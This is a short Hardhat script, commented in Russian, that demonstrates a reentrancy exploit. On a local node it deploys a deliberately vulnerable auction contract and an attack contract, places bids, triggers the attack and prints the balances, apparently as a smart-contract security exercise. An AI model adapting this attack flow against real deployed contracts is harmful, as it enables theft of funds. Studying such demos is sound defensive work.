const hre = require('hardhat')
const ethers = hre.ethers
const { expect } = require("chai")

// npx hardhat node
// npx hardhat run scripts/Scripts_for_AttackContract.js --network localhost
// scripts/Scripts_for_AttackContract.js

async function main() {
    const [bidder1, bidder2, hacker] = await ethers.getSigners();

    // Просто по дефолту разворачиваем два смарт-контракта
    const ReentrancyContractAuction = await ethers.getContractFactory("ReentrancyContractAuction", bidder1)
    const auction = await ReentrancyContractAuction.deploy()
    await auction.deploymentTransaction()

    const ReentrancyAttack = await ethers.getContractFactory("ReentrancyAttack", hacker)
    const attack = await ReentrancyAttack.deploy(auction)
    await attack.deploymentTransaction()

    // console.log('provider');
    // console.log("Auction balance", await ethers.provider.getBalance(auction.address))
    // console.log("Attacker balance", await ethers.provider.getBalance(attack.address))
    // console.log("Bidder2 balance", await ethers.provider.getBalance(bidder2.address))
    
    // Делаем ставки
    // Нет коннекта
    const txBid = await auction.bid({value: ethers.parseEther("4.0")})
    await txBid.wait()

    const txBid2 = await auction.connect(bidder2).bid({value: ethers.parseEther("8.0")})
    await txBid2.wait()

    const txBid3 = await attack.connect(hacker).proxybid({value: ethers.parseEther("1.0")})
    await txBid3.wait()

    console.log("Auction balance", await ethers.provider.getBalance(auction))

    const doAttack = await attack.connect(hacker).attack()
    await doAttack.wait()

    
    console.log("Auction balance", await ethers.provider.getBalance(auction))
    console.log("Attacker balance", await ethers.provider.getBalance(attack))
    console.log("Bidder2 balance", await ethers.provider.getBalance(bidder2))
}

main()
